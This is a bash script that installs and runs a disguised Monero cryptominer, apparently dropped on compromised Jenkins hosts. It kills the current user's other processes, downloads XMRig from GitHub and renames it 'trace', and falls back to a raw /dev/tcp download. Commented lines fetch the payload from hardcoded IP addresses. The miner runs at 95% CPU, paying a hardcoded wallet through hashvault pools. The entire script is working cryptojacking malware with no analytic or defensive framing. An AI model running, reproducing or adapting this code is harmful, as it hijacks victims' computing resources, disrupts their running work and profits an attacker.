#!/bin/bash

if [[ $(whoami) != "root" ]]; then
    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
        kill -9 $tr || : ;
    done;
fi

threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

rm -rf config.json;

d () {
	curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
}

#test ! -s trace && \
#    (d http://87.44.19.162/job/Insecure-Jenkins/ws/trace trace || \
#     d http://54.88.236.33/job/Insecure-Jenkins/ws/trace trace)

test ! -s trace && \
    d https://github.com/xmrig/xmrig/releases/download/v2.8.3/xmrig-2.8.3-xenial-amd64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-2.8.3/xmrig trace && \
    rm -rf xmrig-2.8.3 && \
    rm -rf trace.tgz;

test ! -x trace && chmod +x trace;

k() {
    ./trace \
        -r 2 \
        -R 2 \
        --keepalive \
        --no-color \
        --donate-level 1 \
        --max-cpu-usage 95 \
        --cpu-priority 3 \
        --print-time 25 \
        --threads ${threadCount:-4} \
        --url $1 \
        --user 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyhgKUqjg6HRgENMQm \
        --pass PC_${hostHash:-abc} \
        --keepalive
}

k pool.monero.hashvault.pro:3333 || k pool.monero.hashvault.pro:5555


